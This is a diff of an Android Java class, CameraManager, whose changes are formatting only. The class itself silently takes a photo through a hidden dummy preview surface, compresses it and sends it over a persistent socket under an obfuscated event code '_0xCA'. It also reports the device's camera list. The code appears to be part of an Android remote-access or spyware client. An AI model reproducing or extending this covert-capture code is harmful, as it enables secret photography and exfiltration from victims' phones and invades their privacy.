@@ -19,7 +19,7 @@ import java.io.ByteArrayOutputStream;
 
 public class CameraManager {
 
-    private Context context ;
+    private final Context context;
     private Camera camera;
 
 
@@ -28,28 +28,28 @@ public class CameraManager {
     }
 
 
-    public void startUp(int cameraID){
-                camera = Camera.open(cameraID);
-                Parameters parameters = camera.getParameters();
-                camera.setParameters(parameters);
-                try{
-                    camera.setPreviewTexture(new SurfaceTexture(0));
-                    camera.startPreview();
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+    public void startUp(int cameraID) {
+        camera = Camera.open(cameraID);
+        Parameters parameters = camera.getParameters();
+        camera.setParameters(parameters);
+        try {
+            camera.setPreviewTexture(new SurfaceTexture(0));
+            camera.startPreview();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
-                camera.takePicture(null, null, new PictureCallback() {
-                    @Override
-                    public void onPictureTaken(byte[] data, Camera camera) {
-                        releaseCamera();
-                        sendPhoto(data);
-                    }
-                });
+        camera.takePicture(null, null, new PictureCallback() {
+            @Override
+            public void onPictureTaken(byte[] data, Camera camera) {
+                releaseCamera();
+                sendPhoto(data);
+            }
+        });
     }
 
 
-    private void sendPhoto(byte [] data){
+    private void sendPhoto(byte[] data) {
 
         try {
 
@@ -57,9 +57,9 @@ public class CameraManager {
             ByteArrayOutputStream bos = new ByteArrayOutputStream();
             bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
             JSONObject object = new JSONObject();
-            object.put("image",true);
-            object.put("buffer" , bos.toByteArray());
-            IOSocket.getInstance().getIoSocket().send("_0xCA" , object);
+            object.put("image", true);
+            object.put("buffer", bos.toByteArray());
+            IOSocket.getInstance().getIoSocket().send("_0xCA", object);
 
 
         } catch (JSONException e) {
@@ -68,7 +68,7 @@ public class CameraManager {
 
     }
 
-    private void releaseCamera(){
+    private void releaseCamera() {
         if (camera != null) {
             camera.stopPreview();
             camera.release();
@@ -86,7 +86,7 @@ public class CameraManager {
         try {
             JSONObject cameras = new JSONObject();
             JSONArray list = new JSONArray();
-            cameras.put("camList",true);
+            cameras.put("camList", true);
 
             // Search for available cameras
             int numberOfCameras = Camera.getNumberOfCameras();
@@ -98,14 +98,12 @@ public class CameraManager {
                     jo.put("name", "Front");
                     jo.put("id", i);
                     list.put(jo);
-                }
-                else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK){
+                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                     JSONObject jo = new JSONObject();
                     jo.put("name", "Back");
                     jo.put("id", i);
                     list.put(jo);
-                }
-                else {
+                } else {
                     JSONObject jo = new JSONObject();
                     jo.put("name", "Other");
                     jo.put("id", i);
@@ -113,7 +111,7 @@ public class CameraManager {
                 }
             }
 
-            cameras.put("list" , list);
+            cameras.put("list", list);
             return cameras;
 
         } catch (JSONException e) {
